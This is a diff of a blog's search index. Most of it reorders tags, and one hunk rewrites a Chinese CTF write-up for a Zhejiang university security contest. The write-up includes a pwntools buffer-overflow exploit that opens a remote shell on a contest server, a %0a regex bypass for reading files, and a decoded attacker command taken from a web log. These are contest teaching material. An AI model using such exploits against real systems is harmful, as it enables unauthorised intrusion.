@@ -76,9 +76,9 @@
       
       <tag>wp</tag>
       
-      <tag>awdp</tag>
-      
       <tag>羊城杯</tag>
+      
+      <tag>awdp</tag>
       
     </tags>
     
@@ -624,9 +624,9 @@
     
     <tags>
       
-      <tag>wp</tag>
-      
       <tag>awd</tag>
+      
+      <tag>wp</tag>
       
       <tag>台州</tag>
       
@@ -761,9 +761,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
       <tag>web入门</tag>
       
@@ -846,9 +846,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>总结</tag>
+      
+      <tag>misc</tag>
       
       <tag>内存取证</tag>
       
@@ -877,9 +877,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>总结</tag>
+      
+      <tag>misc</tag>
       
       <tag>隐写术</tag>
       
@@ -906,9 +906,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>总结</tag>
+      
+      <tag>misc</tag>
       
       <tag>隐写</tag>
       
@@ -937,9 +937,9 @@
     
     <tags>
       
-      <tag>misc</tag>
-      
       <tag>总结</tag>
+      
+      <tag>misc</tag>
       
       <tag>编码</tag>
       
@@ -1163,9 +1163,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
     </tags>
     
@@ -1244,9 +1244,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
       <tag>web入门</tag>
       
@@ -1273,9 +1273,9 @@
     
     <tags>
       
-      <tag>ctfshow</tag>
-      
       <tag>wp</tag>
+      
+      <tag>ctfshow</tag>
       
       <tag>web入门</tag>
       
@@ -1358,9 +1358,9 @@
     
     <tags>
       
-      <tag>击剑杯</tag>
-      
       <tag>ctfshow</tag>
+      
+      <tag>击剑杯</tag>
       
     </tags>
     
@@ -1439,11 +1439,11 @@
     
     <tags>
       
+      <tag>绕过</tag>
+      
       <tag>web</tag>
       
       <tag>极客2021</tag>
-      
-      <tag>绕过</tag>
       
     </tags>
     
@@ -1468,9 +1468,9 @@
     
     <tags>
       
-      <tag>区块链</tag>
-      
       <tag>solidity</tag>
+      
+      <tag>区块链</tag>
       
     </tags>
     
@@ -1568,7 +1568,7 @@
     <link href="/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP.html"/>
     <url>/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWP.html</url>
     
-    <content type="html"><![CDATA[<h1 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h1><p>校战队：Vec-crw</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="远古特性"><a href="#远古特性" class="headerlink" title="远古特性"></a>远古特性</h3><p>web签到题，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Present from glzjin :)</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^hint\/hint.txt$/m&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try again!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是符合条件<code>hint/hint.txt</code>后换行直接读取文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-2.png"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="sai-easy"><a href="#sai-easy" class="headerlink" title="sai_easy"></a>sai_easy</h3><p>pwn签到题<br>分析文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-3.png"><br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;sai_easy_pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;</span>,<span class="hljs-number">53100</span>)<br>str_bin=<span class="hljs-number">0x601098</span><br>sys_add=<span class="hljs-number">0x400760</span><br>pop_rdi=<span class="hljs-number">0x0000000000400b23</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(str_bin)+p64(sys_add))</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x40098e</span>))<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x30)</span><br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x8+p64(sys_add)+p64(0x6010e0)+p64(pop_rdi)+p64(str_bin)+p64(0x0000000000400aa4))</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="preprocess"><a href="#preprocess" class="headerlink" title="preprocess"></a>preprocess</h3><p>通过对c文件的分析发现实际上有一种类似base64的效果<br>将字符串每三个字节按照六位一组进行分隔<br>先进行取反<br>然后对这六位二进制进行换位操作<br>然后进行对照 如果不相同编译时就会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br><span class="hljs-keyword">import</span> re<br>d=f.read()<br>e=re.findall(<span class="hljs-string">&#x27; \^ (.+)&#x27;</span>,d)<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    cache=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">if</span> cache[j]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>            data+=<span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            data+=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(data)<br>flag=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper())<br><span class="hljs-built_in">print</span>(base64.b16decode(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper().strip(<span class="hljs-string">&#x27;L&#x27;</span>)))<br></code></pre></td></tr></table></figure><h3 id="最简单的逆向"><a href="#最简单的逆向" class="headerlink" title="最简单的逆向"></a>最简单的逆向</h3><p>分析文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=[chr(<span class="hljs-number">0</span>x76-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x73-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x85-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x75-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x86-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x78-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAD-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x66-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAF-<span class="hljs-number">50</span>)]<br><span class="hljs-attribute">print</span>(&#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-5.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h3><p>简单的base嵌套</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>b1=base64.b64decode<br>b2=base64.b32decode<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decode_and_decode.txt&#x27;</span>)<br>f=f.read()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        f=base64.b16decode(f)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f=base64.b32decode(f)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">try</span>:<br>                f=base64.b64decode(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(f)<br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h3><p>从pdf中得到名字和生日，互相组合一下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-6.png"><br>密码为向晚0612</p><h3 id="site-log"><a href="#site-log" class="headerlink" title="site_log"></a>site_log</h3><p>分析文件发现evil.php文件比较可疑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;my_site.log&#x27;</span>)<br>d=f.readlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;evil.php&#x27;</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>使用脚本获取evil.php文件的日志</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">45</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">80</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">50</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">51</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">73</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">114</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">122</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">112</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)]))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-8.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">密码为hehehe233_Igotroot<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>大部分做的都是签到题，还有很多不会的地方，总之，学无止尽，继续学习吧</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h1 id="远古特性"><a href="#远古特性" class="headerlink" title="远古特性"></a>远古特性</h1><p>web签到题，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Present from glzjin :)</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^hint\/hint.txt$/m&#x27;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try again!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是符合条件<code>hint/hint.txt</code>后换行直接读取文件，<code>%0a</code>绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-2.png"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h1 id="sai-easy"><a href="#sai-easy" class="headerlink" title="sai_easy"></a>sai_easy</h1><p>pwn签到题<br>分析文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-3.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;sai_easy_pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com&#x27;</span>,<span class="hljs-number">53100</span>)<br>str_bin=<span class="hljs-number">0x601098</span><br>sys_add=<span class="hljs-number">0x400760</span><br>pop_rdi=<span class="hljs-number">0x0000000000400b23</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>)<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*8+p64(pop_rdi)+p64(str_bin)+p64(sys_add))</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x40098e</span>))<br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x30)</span><br><span class="hljs-comment">#p.send(b&#x27;a&#x27;*0x8+p64(sys_add)+p64(0x6010e0)+p64(pop_rdi)+p64(str_bin)+p64(0x0000000000400aa4))</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h1 id="preprocess"><a href="#preprocess" class="headerlink" title="preprocess"></a>preprocess</h1><p>通过对c文件的分析发现实际上有一种类似base64的效果<br>将字符串每三个字节按照六位一组进行分隔<br>先进行取反<br>然后对这六位二进制进行换位操作<br>然后进行对照 如果不相同编译时就会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>)<br><span class="hljs-keyword">import</span> re<br>d=f.read()<br>e=re.findall(<span class="hljs-string">&#x27; \^ (.+)&#x27;</span>,d)<br>data=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    cache=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]:<br>        <span class="hljs-keyword">if</span> cache[j]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>            data+=<span class="hljs-string">&#x27;0&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            data+=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(data)<br>flag=<span class="hljs-built_in">int</span>(data,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper())<br><span class="hljs-built_in">print</span>(base64.b16decode(<span class="hljs-built_in">hex</span>(flag)[<span class="hljs-number">2</span>:].upper().strip(<span class="hljs-string">&#x27;L&#x27;</span>)))<br></code></pre></td></tr></table></figure><h1 id="最简单的逆向"><a href="#最简单的逆向" class="headerlink" title="最简单的逆向"></a>最简单的逆向</h1><p>分析文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=[chr(<span class="hljs-number">0</span>x76-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x73-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x85-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x75-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x86-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x78-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAD-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x64-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6B-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x67-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x62-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x96-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x69-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x65-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x66-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x97-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x98-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x6A-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x95-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>x68-<span class="hljs-number">50</span>),chr(<span class="hljs-number">0</span>xAF-<span class="hljs-number">50</span>)]<br><span class="hljs-attribute">print</span>(&#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjss-5.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="decode-and-decode"><a href="#decode-and-decode" class="headerlink" title="decode_and_decode"></a>decode_and_decode</h1><p>简单的base嵌套</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>b1=base64.b64decode<br>b2=base64.b32decode<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decode_and_decode.txt&#x27;</span>)<br>f=f.read()<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        f=base64.b16decode(f)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f=base64.b32decode(f)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">try</span>:<br>                f=base64.b64decode(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(f)<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h1 id="asoul-lover"><a href="#asoul-lover" class="headerlink" title="asoul_lover"></a>asoul_lover</h1><p>从pdf中得到名字和生日，互相组合一下</p><p><img 